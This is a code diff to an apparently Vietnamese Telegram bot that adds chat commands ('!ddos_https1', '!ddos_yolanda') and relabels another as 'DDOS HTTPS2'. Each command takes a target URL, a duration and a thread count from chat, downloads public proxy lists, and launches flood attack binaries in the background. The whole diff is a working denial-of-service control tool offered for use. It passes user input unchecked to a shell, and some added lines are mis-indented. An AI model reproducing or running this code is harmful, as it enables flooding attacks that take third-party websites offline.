@@ -48,12 +48,43 @@ def handle_message(message):
 def handle_message(message):
     url = message.text.split(" ")[1]
     floodtime = message.text.split(" ")[2]
-    text = "𝙏𝙤𝙠𝙞𝙞𝙏𝙤𝙤𝙡𝙨 - 𝙏𝙧𝙖𝙣𝙓𝙪𝙖𝙣𝙎𝙤𝙣\n\n[ SPAM ]\n  • URL: "+url+"\n  • Thời Gian: "+floodtime+" Giây"
+    text = "𝙏𝙤𝙠𝙞𝙞𝙏𝙤𝙤𝙡𝙨 - 𝙏𝙧𝙖𝙣𝙓𝙪𝙖𝙣𝙎𝙤𝙣\n\n[ DDOS HTTPS2 ]\n  • URL: "+url+"\n  • Thời Gian: "+floodtime+" Giây"
     bot.send_message(message.chat.id, text)
     http_proxy = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
     with open("utils/http.txt", 'w') as p:
         p.write(httpx.get(http_proxy).text)
     subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
+
+#DDOS_HTTPS1
+@bot.message_handler(regexp="!ddos_https1")
+def handle_message(message):
+    target = message.text.split(" ")[1]
+    floodtime = int(message.text.split(" ")[2])
+    thread = int(message.text.split(" ")[3])
+    text = "𝙏𝙤𝙠𝙞𝙞𝙏𝙤𝙤𝙡𝙨 - 𝙏𝙧𝙖𝙣𝙓𝙪𝙖𝙣𝙎𝙤𝙣\n\n[ DDOS HTTPS1 ]\n  • URL: "+target+"\n  • Thời Gian: "+str(floodtime)+" Giây\n  • Số Luồng: "+str(thread)
+    bot.send_message(message.chat.id, text)
+    with open("proxy_providers.txt", mode="r") as readurl:
+        for url in readurl:
+            url = url.strip()
+            with open("proxies.txt", mode="a") as file:
+            file.write(requests.get(url, timeout=1000).text)
+    subprocess.run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} proxy {thread}'], shell=True)
+
+#DDOS_YOLANDA
+@bot.message_handler(regexp="!ddos_yolanda")
+def handle_message(message):
+    target = message.text.split(" ")[1]
+    floodtime = int(message.text.split(" ")[2])
+    thread = int(3)
+    text = "𝙏𝙤𝙠𝙞𝙞𝙏𝙤𝙤𝙡𝙨 - 𝙏𝙧𝙖𝙣𝙓𝙪𝙖𝙣𝙎𝙤𝙣\n\n[ DDOS YOLANDA ]\n  • URL: "+target+"\n  • Thời Gian: "+str(floodtime)+" Giây\n  • Số Luồng: "+str(thread)
+    bot.send_message(message.chat.id, text)
+    with open("proxy_providers.txt", mode="r") as readurl:
+        for url in readurl:
+            url = url.strip()
+            with open("proxies.txt", mode="a") as file:
+            file.write(requests.get(url, timeout=1000).text)
+    subprocess.run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} proxy {thread}'], shell=True)
+
 
 
 
